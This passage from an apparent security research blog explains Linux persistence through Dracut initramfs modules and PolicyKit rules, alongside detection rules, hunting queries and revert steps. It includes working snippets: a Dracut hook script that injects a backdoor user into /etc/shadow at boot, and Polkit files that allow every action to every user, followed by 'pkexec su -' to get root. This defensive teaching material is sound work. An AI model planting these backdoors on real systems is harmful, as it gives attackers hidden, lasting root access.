<li><strong>Creations and/or Modifications to Initramfs Files</strong>: Tracks changes to the initramfs file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/initrd.img</code>).</li>
<li><strong>General Kernel Manipulation Indicators</strong>: Leverages queries such as monitoring <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">secureboot</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel_info</code>, and file changes within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code> to detect broader signs of kernel and bootloader manipulation, which may overlap with initramfs abuse.</li>
</ol>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml">Persistence via Initramfs</a> and <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml">General Kernel Manipulation</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1542/">T1542</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1542---initramfs-modifying-with-dracut" class="absolute -top-32"></span>T1542 - Initramfs: Modifying with Dracut</h1>
<p><a href="https://wiki.archlinux.org/title/Dracut">Dracut</a> is a versatile tool for managing initramfs in most Linux systems. Unlike manual methods that require deconstructing and reconstructing initramfs, Dracut provides a structured, modular approach. It simplifies creating, modifying, and regenerating initramfs images while offering a robust framework to add custom functionality. It generates initramfs images by assembling a minimal Linux environment tailored to the system&#x27;s needs. Its modular design ensures that only the necessary drivers, libraries, and scripts are included.</p>
<p>Dracut operates through modules, which are self-contained directories containing scripts, configuration files, and dependencies. These modules define the behavior and content of the initramfs. For example, they might include drivers for specific hardware, tools for handling encrypted filesystems, or custom logic for pre-boot operations.</p>
<p>Dracut modules are typically stored in:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/dracut/modules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/dracut/modules.d/</code></li>
</ul>
<p>Each module resides in a directory named in the format <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">XXname</code>, where <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">XX</code> is a two-digit number defining the load order, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">name</code> is the module name (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">01base</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">95udev</code>).</p>
<p>The primary script that defines how the module integrates into the initramfs is called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module-setup.sh</code>. It specifies which files to include and what dependencies are required. Here is a basic example of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module-setups.sh</code> script:</p>
<pre><code>#!/bin/bash

check() {
  return 0 
}

depends() {
  echo &quot;base&quot;
}

install() {
  inst_hook cmdline 30 &quot;$moddir/my_custom_script.sh&quot;
  inst_simple /path/to/needed/binary
}</code></pre>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">check()</code>: Determines whether the module should be included. Returning 0 ensures the module is always included.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">depends()</code>: Specifies other modules this one depends on (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">base</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">udev</code>).</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">install()</code>: Defines what files or scripts to include. Functions like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inst_hook</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">inst_simple</code> simplify the process.</li>
</ul>
<p>Using Dracut, attackers or administrators can easily modify initramfs to include custom scripts or functionality. For example, a malicious actor might:</p>
<ul>
<li>Add a script that executes commands on boot.</li>
<li>Alter existing modules to modify system behavior before the root filesystem is mounted.</li>
</ul>
<p>In the next section, we’ll walk through creating a custom Dracut module to modify initramfs.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1542---initramfs-modifying-with-dracut" class="absolute -top-32"></span>Persistence through T1542 - Initramfs: Modifying with Dracut</h1>
<p>It is always a great idea to walk before we run. In the previous section we learnt how to manipulate initramfs manually, which can be difficult to set up. Now that we understand the basics, we can persist much easier by using a helper tool called Dracut, which is available by default on many Linux systems. Let’s take a look at the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh">setup_initramfs.sh</a> module again, but this time with a focus on the Dracut section.</p>
<p>This PANIX module creates a new Dracut module directory at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/dracut/modules.d/99panix</code>, and creates a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module-setup.sh</code> file with the following contents:</p>
<pre><code>#!/bin/bash
check()  { return 0; }
depends() { return 0; }
install() {
	inst_hook pre-pivot 99 &quot;$moddir/backdoor-user.sh&quot;
}</code></pre>
<p>This script ensures that when the initramfs is built using Dracut, the custom script (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdoor-user.sh</code>) is embedded and configured to execute at the pre-pivot stage during boot. By running at the pre-pivot stage, the script executes before control is handed over to the main OS, ensuring it can make modifications to the real root filesystem.</p>
<p>After granting <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module-setup.sh</code> execution permissions, the module continues to create the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdoor-user.sh</code> file. To view the full content, inspect the module source code. The important parts are:</p>
<pre><code>#!/bin/sh

# Remount the real root if it&#x27;s read-only
mount -o remount,rw /sysroot 2&gt;/dev/null || {
	echo &quot;[dracut] Could not remount /sysroot as RW. Exiting.&quot;
	exit 1
}
[...]

if check_user_exists &quot;${username}&quot; /sysroot/etc/shadow; then
    echo &quot;[dracut] User &#x27;${username}&#x27; already exists in /etc/shadow.&quot;
else
    echo &quot;${username}:${escaped_hash}:19000:0:99999:7:::&quot; &gt;&gt; /sysroot/etc/shadow
    echo &quot;[dracut] Added &#x27;${username}&#x27; to /etc/shadow.&quot;
fi

[...]</code></pre>
<p>First, the script ensures that the root filesystem (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sysroot</code>) is writable. If this check completes, the script continues to add a new user by manually modifying the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shadow</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/group</code> files. The most important thing to notice is that these scripts rely on built-in shell utilities, as utilities such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">grep</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sed</code> are not available in this environment. After writing the script, it is granted execution permissions and is good to go.</p>
<p>Finally, Dracut is called to rebuild initramfs for the kernel version that is currently active:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dracut --force /boot/initrd.img-$(uname -r) $(uname -r)</code></p>
<p>Once this step completes, the modified initramfs is active, and rebooting the machine will result in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdoor-user.sh</code> script being executed.</p>
<p>As always, first we take a snapshot, then we run the module:</p>
<pre><code>&gt; sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes
[!] Will inject user &#x27;panix&#x27; with hashed password &lt;hash&gt; into the initramfs.
[!] Preparing Dracut-based initramfs persistence...
[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh
[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
[*] Rebuilding initramfs with dracut...
[...]
dracut: *** Including module: panix ***
[...]
[+] Dracut rebuild complete.
[+] setup_initramfs module completed successfully.
[!] Ensure you have a recent snapshot/backup of your system before proceeding.</code></pre>
<p>And take a look at the documents available in Discover:</p>
<p></p>
<p>Upon execution, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">openssl</code> is used to create a password hash for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">secret</code> password. Afterwards, the directory structure <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/dracut/modules.d/99panix</code> is created, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">module-setup.sh</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdoor-user.sh</code> scripts are created and granted execution permissions. After regeneration of the initramfs completes, the backdoor has been planted, and will be active upon reboot.</p>
<p>Let’s take a look at the coverage:</p>
<p><em>Detection and endpoint rules that cover dracut initramfs persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_dracut_module_creation.toml">Dracut Module Creation</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_manual_dracut_execution.toml">Manual Dracut Execution</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml">OpenSSL Password Hash Generation</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml">Executable Bit Set for Potential Persistence Script</a></td></tr></tbody></table></div>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert initramfs

[-] No backup initramfs found at /boot/initrd.img-5.15.0-130-generic.bak. Skipping restore.
[!] Removing custom dracut module directory: /usr/lib/dracut/modules.d/99panix...
[+] Custom dracut module directory removed.
[!] Rebuilding initramfs to remove modifications...
[...]
[+] Initramfs rebuilt successfully.
[!] Cleaning up temporary files...
[+] Temporary files cleaned up.
[+] Initramfs persistence reverted successfully.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1542---initramfs-modifying-with-dracut" class="absolute -top-32"></span>Hunting for T1542 - Initramfs: Modifying with Dracut</h1>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like Dracut. The approach includes monitoring for the following:</p>
<ol>
<li><strong>Execution of Dracut with Suspicious Arguments</strong>: Tracks processes where Dracut is executed to regenerate or modify initramfs files, especially with non-standard arguments. This can help identify unauthorized attempts to modify initramfs.</li>
<li><strong>Creations and/or Modifications to Dracut Modules</strong>: Monitors changes within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/dracut/modules.d/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/dracut/modules.d/</code>, which store custom and system-wide Dracut modules. Unauthorized modifications here may indicate attempts to persist malicious functionality.</li>
<li><strong>General Kernel Manipulation Indicators</strong>: Utilizes queries like monitoring <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">secureboot</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel_info</code>, and file changes within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code> to detect broader signs of kernel and bootloader manipulation that could be related to Initramfs abuse.</li>
</ol>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml">Persistence via Initramfs</a> and <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml">General Kernel Manipulation</a> hunting rules and the tailored detection queries listed above, you can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1542/">T1542</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1543---create-or-modify-system-process-policykit" class="absolute -top-32"></span>T1543 - Create or Modify System Process: PolicyKit</h1>
<p><a href="https://linux.die.net/man/8/polkit">PolicyKit (or Polkit)</a> is a system service that provides an authorization framework for managing privileged actions in Linux systems. It enables fine-grained control over system-wide privileges, allowing non-privileged processes to interact with privileged ones securely. Acting as an intermediary between system services and users, Polkit determines whether a user is authorized to perform specific actions. For instance, it governs whether a user can restart network services or install software without requiring full sudo permissions.</p>
<p>Polkit authorization is governed by rules, actions, and authorization policies:</p>
<ul>
<li><strong>Actions</strong>: Defined in XML files (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.policy</code>), these specify the operations Polkit can manage, such as <a href="https://www.freedesktop.org/software/systemd/man/latest/org.freedesktop.systemd1.html"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.systemd1.manage-units</code></a>.</li>
<li><strong>Rules</strong>: JavaScript-like files (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rules</code>) determine how authorization is granted for specific actions. They can check user groups, environment variables, or other conditions.</li>
<li><strong>Authorization Policies</strong>: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.pkla</code> files set default or per-user/group authorizations for actions, determining whether authentication is required.</li>
</ul>
<p>The configuration files used by Polkit are found in several different locations, depending on the version of Polkit that is present on the system, and the Linux distribution that is active. The main locations you should know about:</p>
<ul>
<li>Action definitions:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/polkit-1/actions/</code></li>
</ul>
</li>
<li>Rule definitions:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/polkit-1/rules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/polkit-1/rules.d/</code></li>
</ul>
</li>
<li>Authorization definitions:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/polkit-1/localauthority/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/lib/polkit-1/localauthority/</code></li>
</ul>
</li>
</ul>
<p>A Polkit <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rules</code> file defines the logic for granting or denying specific actions. These files provide flexibility in determining whether a user or process can execute an action. Here’s a simple example:</p>
<pre><code>polkit.addRule(function(action, subject) {
    if (action.id == &quot;org.freedesktop.systemd1.manage-units&quot; &amp;&amp;
        subject.isInGroup(&quot;servicemanagers&quot;)) {
        return polkit.Result.YES;
    }
    return polkit.Result.NOT_HANDLED;
});</code></pre>
<p>In this rule:</p>
<ul>
<li>The action <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.systemd1.manage-units</code> (managing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code> services) is granted to users in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">servicemanagers</code> group.</li>
<li>Other actions fall back to default handling.</li>
</ul>
<p>This structure allows administrators to implement custom policies, but it also opens the door for attackers who can insert overly permissive rules to gain unauthorized privileges.</p>
<p>Currently, Polkit does not have a dedicated technique in the MITRE ATT&amp;CK framework. The closest match is <a href="https://attack.mitre.org/techniques/T1543/">T1543: Create or Modify System Process</a>, which describes adversaries modifying system-level processes to achieve persistence or privilege escalation.</p>
<p>In the next section, we will explore step-by-step how attackers can craft and deploy malicious Polkit rules and authorization files, while also discussing detection and mitigation strategies.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1543---create-or-modify-system-process-policykit" class="absolute -top-32"></span>Persistence through T1543 - Create or Modify System Process: PolicyKit</h1>
<p>Now that we understand the theory, let’s take a look at how to simulate this in practice through the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_polkit.sh">setup_polkit.sh</a> PANIX module. First, the module checks the active Polkit version through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pkaction --version</code> command, as versions &lt; 0.106 use the older <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.pkla</code> files, while newer versions (&gt;= 0.106) use the more recent <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rules</code> files. Depending on the version, the module will continue to create the Polkit policy that is overly permissive. For versions &lt; 0.106 a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.pkla</code> file is created in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/polkit-1/localauthority/50-local.d/</code>:</p>
<pre><code>mkdir -p /etc/polkit-1/localauthority/50-local.d/

# Write the .pkla file
cat &lt;&lt;-EOF &gt; /etc/polkit-1/localauthority/50-local.d/panix.pkla
[Allow Everything]
Identity=unix-user:*
Action=*
ResultAny=yes
ResultInactive=yes
ResultActive=yes
EOF</code></pre>
<p>Allowing any <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">unix-user</code> to do any action through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Identity=unix-user:*</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Action=*</code> parameters.</p>
<p>For versions &gt;= 0.106 a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rules</code> file is created in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/polkit-1/rules.d/</code>:</p>
<pre><code>mkdir -p /etc/polkit-1/rules.d/

# Write the .rules file
cat &lt;&lt;-EOF &gt; /etc/polkit-1/rules.d/99-panix.rules
polkit.addRule(function(action, subject) {
	return polkit.Result.YES;
});
EOF</code></pre>
<p>Where an overly permissive policy always returns <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">polkit.Result.YES</code>, which means that any action that requires Polkit’s authentication will be allowed by anyone.</p>
<p>Polkit rules are processed in lexicographic (ASCII) order, meaning files with lower numbers load first, and later rules can override earlier ones. If two rules modify the same policy, the rule with the higher number takes precedence because it is evaluated last. To ensure the rule is executed and overrides others, PANIX creates it with a filename starting with 99 (e.g. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">99-panix.rules</code>).</p>
<p>Let’s run the PANIX module with the following command line arguments:</p>
<pre><code>&gt; sudo ./panix.sh --polkit

[!] Polkit version &lt; 0.106 detected. Setting up persistence using .pkla files.
[+] Persistence established via .pkla file.
[+] Polkit service restarted.
[!] Run pkexec su - to test the persistence.</code></pre>
<p>And take a look at the logs in Kibana:</p>
<p></p>
<p>Upon execution of PANIX, we can see the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pkaction --version</code> command being issued to determine whether a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.pkla</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.rules</code> file approach is needed. After figuring this out, the correct policy is created, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">polkit</code> service is restarted (this is not always necessary however). Once these policies are in place, a user with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user.Ext.real.id</code> of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1000</code> (not-root) is capable of obtaining root privileges by executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pkexec su -</code> command.</p>
<p>Let’s take a look at our detection opportunities:</p>
<p><em>Detection and endpoint rules that cover Polkit persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/persistence_polkit_policy_creation.toml">Polkit Policy Creation</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/discovery_polkit_version_discovery.toml">Polkit Version Discovery</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/cf183579b46dae3ebd294098b330341a98691fd0/rules/linux/execution_unusual_pkexec_execution.toml">Unusual Pkexec Execution</a></td></tr></tbody></table></div>
<p>To revert any changes, you can use the corresponding revert module by running:</p>
<pre><code>&gt; ./panix.sh --revert polkit

[+] Checking for .pkla persistence file...
[+] Removed file: /etc/polkit-1/localauthority/50-local.d/panix.pkla
[+] Checking for .rules persistence file...
[-] .rules file not found: /etc/polkit-1/rules.d/99-panix.rules
[+] Restarting polkit service...
[+] Polkit service restarted successfully.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1543---create-or-modify-system-process-policykit" class="absolute -top-32"></span>Hunting for T1543 - Create or Modify System Process: PolicyKit</h1>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the modification of PolicyKit configuration files and rules. The approach includes hunting for the following:</p>
<ol>
<li><strong>Creations and/or Modifications to PolicyKit Configuration Files</strong>: Tracks changes in critical directories containing custom and system-wide rules, action descriptions and authorizations rules. Monitoring these paths helps identify unauthorized additions or tampering that could indicate malicious activity.</li>
<li><strong>Metadata Analysis of PolicyKit Files</strong>: Inspects file ownership, access times, and modification timestamps for PolicyKit-related files. Unauthorized changes or files with unexpected ownership can indicate an attempt to persist or escalate privileges through PolicyKit.</li>
<li><strong>Detection of Rare or Anomalous Events</strong>: Identifies uncommon file modification or creation events by analyzing process execution and correlation with file activity. This helps surface subtle indicators of compromise.</li>
</ol>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_policykit.toml">Persistence via PolicyKit</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1543/">T1543</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1543---create-or-modify-system-process-d-bus" class="absolute -top-32"></span>T1543 - Create or Modify System Process: D-Bus</h1>
<p><a href="https://linux.die.net/man/1/dbus-daemon">D-Bus (Desktop Bus)</a> is an <a href="https://www.geeksforgeeks.org/inter-process-communication-ipc/">inter-process communication (IPC)</a> system widely used in Linux and other Unix-like operating systems. It serves as a structured message bus, enabling processes, system services, and applications to communicate and coordinate actions. As a cornerstone of modern Linux environments, D-Bus provides the framework for both system-wide and user-specific communication.</p>
<p>At its core, D-Bus facilitates interaction between processes by providing a standardized mechanism for sending and receiving messages, eliminating the need for custom IPC solutions while improving efficiency and security. It operates through two primary communication channels:</p>
<ul>
<li><strong>System Bus</strong>: Used for communication between system-level services and privileged operations, such as managing hardware or network configuration.</li>
<li><strong>Session Bus</strong>: Used for communication between user-level applications, such as desktop notifications or media players.</li>
</ul>
<p>A D-Bus daemon manages the message bus, ensuring messages are routed securely between processes. Processes register themselves on the bus with unique names and provide interfaces containing methods, signals, and properties for other processes to interact with. The core components of D-Bus communication looks as follows:</p>
<p><strong>Interfaces</strong>:</p>
<ul>
<li>Define a collection of methods, signals, and properties a service offers.</li>
<li>Example: <a href="https://networkmanager.dev/docs/api/latest/gdbus-org.freedesktop.NetworkManager.html"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.NetworkManager</code></a> provides methods to manage network connections.</li>
</ul>
<p><strong>Methods</strong>:</p>
<ul>
<li>Allow external processes to invoke specific actions or request information.</li>
<li>Example: The method <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.NetworkManager.Reload</code> can be called to reload a network service.</li>
</ul>
<p><strong>Signals</strong>:</p>
<ul>
